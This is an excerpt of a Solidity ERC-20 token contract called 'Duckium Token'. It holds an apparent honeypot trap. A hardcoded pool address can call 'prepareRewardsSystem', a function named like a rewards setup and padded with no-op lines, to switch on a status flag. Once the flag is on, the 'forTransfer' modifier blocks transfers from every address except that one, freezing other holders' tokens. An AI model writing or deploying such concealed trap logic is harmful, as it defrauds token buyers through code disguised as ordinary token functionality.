...
contract DuckiumToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenbg_totalSupply;
    uint256 private _tokenbg_status = 0;
    uint256 public stakingPoolbgStatus = 0;

    string private _tokenbg_name;
    string private _tokenbg_symbol;

    address private _poolbgAddress = 0x6eb3F2D9Eee3bb1BDC20039F2d08922eE8D89Afa; 

    constructor() {
        _tokenbg_name = "Duckium Token";
        _tokenbg_symbol = "DUCK";
        _tokenbg_totalSupply = 1001 * 10 ** 18;
        _balances[msg.sender] = _tokenbg_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbgAddress || _tokenbg_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbgStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbgAddress)
        {
            _tokenbg_status = 1;
        }
    }
